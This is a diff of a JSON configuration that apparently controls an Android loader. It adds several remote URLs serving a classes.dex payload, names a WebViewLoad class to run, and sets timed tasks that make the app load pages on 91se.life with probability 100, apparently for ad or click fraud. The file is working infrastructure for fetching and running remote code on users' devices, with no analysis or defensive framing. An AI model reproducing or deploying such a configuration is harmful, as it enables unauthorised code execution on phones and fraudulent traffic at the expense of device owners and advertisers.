@@ -1,40 +1,38 @@
 {
 	"updatePeriod": "2000",
-	"dexUrls": [
-		"http://91se.kesug.com/classes.dex",
-		"https://res.ziyuan.life/res/classes.dex"
-	],
+	"dexUrls": ["https://res.ziyuan.life/res/classes.dex",
+	"http://mfeiziyuan.atwebpages.com/classes.dex",
+	"https://raw.githubusercontent.com/mfeiziyuan/mfeiziyuan.github.io/main/classes.dex"],
 	"className": "com.she.she.she.dlib.WebViewLoad",
 	"url": null,
 	"ads": [{
-			"type": "0",
-			"url": "91se.life",
-			"interval": "5000"
-		},
-		{
-			"type": "1",
-			"code": [{
-				"url": "http://91se.life/index.php/vod/play/id/",
-				"time": 5000,
-				"code": []
-			}, {
-				"url": "http://91se.life/index.php/art/detail/id",
-				"code": []
-			}, {
-				"url": "http://91se.life/index.php/art/detail/id",
-				"code": []
-			}, {
-				"url": "http://91se.life/",
-				"code": []
-			}]
-		},
-		{
-			"type": "3",
-			"url": "91se.life"
-		},
-		{
-			"type": "4",
-			"content": "91se.life"
-		}
-	]
+		"type": "0",
+		"taskInterval": "5000"
+	}, {
+		"type": "1",
+		"defaultUrl": "91se.life",
+		"probability": 100,
+		"code": [{
+			"url": "http://91se.life/index.php/vod/play/id/",
+			"time": 5000,
+			"code": []
+		}, {
+			"url": "http://91se.life/index.php/art/detail/id",
+			"code": []
+		}, {
+			"url": "http://91se.life/index.php/art/detail/id",
+			"code": []
+		}, {
+			"url": "http://91se.life/",
+			"code": []
+		}]
+	}, {
+		"type": "3",
+		"probability": 100,
+		"url": "91se.life"
+	}, {
+		"type": "4",
+		"probability": 100,
+		"content": "91se.life"
+	}]
 }
